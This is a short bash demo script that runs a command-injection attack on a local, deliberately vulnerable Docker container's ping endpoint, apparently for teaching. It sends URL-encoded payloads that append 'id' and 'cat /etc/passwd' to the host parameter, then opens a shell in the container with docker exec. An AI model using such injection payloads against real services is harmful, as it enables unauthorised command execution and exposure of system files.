#!/usr/bin/env bash
# Run from inside the 01-demo-debian/ folder.
# Build: docker build -f Dockerfile -t 01-demo-debian ..
# Run:   docker run -d --name 01-demo-debian -p 5001:5000 01-demo-debian

set -euo pipefail

VULN="http://localhost:5001"
sep() { echo; echo "─────────────────────────────────────────────"; }

sep
echo "STEP 1: Normal ping -- looks legit"
curl -s "$VULN/ping?host=8.8.8.8" | python3 -m json.tool

sep
echo "STEP 2: Inject a command -- id"
echo "        Payload: ?host=8.8.8.8; id"
curl -s "$VULN/ping?host=8.8.8.8%3B+id" | python3 -m json.tool

sep
echo "STEP 3: Read /etc/passwd"
echo "        Payload: ?host=8.8.8.8; cat /etc/passwd"
curl -s "$VULN/ping?host=8.8.8.8%3B+cat+%2Fetc%2Fpasswd" | python3 -m json.tool

sep
echo "STEP 4: Show /bin/sh is available for the taking"
docker exec 01-demo-debian ls -la /bin/sh /bin/bash

sep
echo "STEP 5: Drop into a shell"
docker exec -it 01-demo-debian /bin/bash
